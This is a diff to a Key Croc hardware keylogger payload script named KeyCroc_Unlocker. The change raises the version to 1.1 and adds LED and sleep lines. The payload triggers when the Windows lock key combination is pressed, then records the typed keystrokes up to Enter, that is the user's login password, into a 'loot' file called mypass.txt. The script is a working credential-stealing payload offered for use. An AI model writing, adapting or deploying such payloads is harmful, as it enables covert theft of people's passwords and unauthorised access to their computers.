@@ -1,9 +1,14 @@
 # Title:           KeyCroc_Unlocker   
 # Description:     Log into windows pc
 # Author:          spywill / RootJunky
-# Version:         1.0
+# Version:         1.1
 # Category:        Key Croc
 #
 #
 MATCH GUI-l
+LED ATTACK
+sleep 2
 SAVEKEYS /root/udisk/loot/mypass.txt UNTIL ENTER
+LED FINISH
+sleep 2
+LED OFF
